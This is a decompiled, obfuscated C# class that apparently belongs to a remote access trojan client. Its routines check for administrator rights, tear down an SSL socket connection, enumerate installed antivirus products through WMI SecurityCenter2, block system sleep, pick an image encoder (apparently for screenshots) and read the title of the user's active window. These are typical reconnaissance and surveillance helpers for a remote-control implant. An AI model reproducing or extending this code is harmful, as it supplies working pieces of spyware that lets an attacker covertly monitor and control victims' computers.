using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Security.Principal;
using System.Text;
using ns1;
using ns21;

namespace ns19;

public static class GClass22
{
	public static bool smethod_0()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void smethod_1()
	{
		try
		{
			if (Convert.ToBoolean(GClass10.string_14) && smethod_0())
			{
				GClass25.smethod_2();
			}
			GClass23.smethod_1();
			GClass28.SslStream_0?.Close();
			GClass28.Socket_0?.Close();
		}
		catch
		{
		}
	}

	public static string smethod_2()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "N/A";
				}
				return string.Join(", ", list.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	public static ImageCodecInfo smethod_3(ImageFormat imageFormat_0)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < imageDecoders.Length)
			{
				val = imageDecoders[num];
				if (val.get_FormatID() == imageFormat_0.get_Guid())
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return val;
	}

	public static void smethod_4()
	{
		try
		{
			GClass24.SetThreadExecutionState((GClass24.GEnum7)2147483651u);
		}
		catch
		{
		}
	}

	public static string smethod_5()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GClass24.GetWindowText(GClass24.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
